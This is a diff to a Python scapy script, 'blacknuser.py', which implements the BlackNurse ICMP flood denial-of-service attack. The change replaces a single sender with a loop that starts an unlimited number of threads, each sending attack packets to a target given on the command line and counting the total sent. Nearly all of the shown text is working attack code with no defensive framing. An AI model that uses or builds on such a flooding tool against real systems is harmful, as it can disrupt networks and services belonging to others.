@@ -2,13 +2,12 @@
 #author Aiden
 
 from scapy.all import *
-import sys , re , socket 
+import sys , re , socket ,threading 
 
 if len(sys.argv) != 2:
 	print "Usage: blacknuser.py <target>"
 	sys.exit(1)
-
-sys.tracebacklimit=0	
+	
 victim = sys.argv[1]
 #iface = 'eth0'
 #socket = conf.L2socket(iface=iface)
@@ -39,8 +38,7 @@ class blacknurse(threading.Thread):
 		print 'Victim not available!'
 		sys.exit(1)
 total = 0	
-black = blacknurse()
 while True:
-	black.run()
+	blacknurse().start()
 	total += 1
 	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
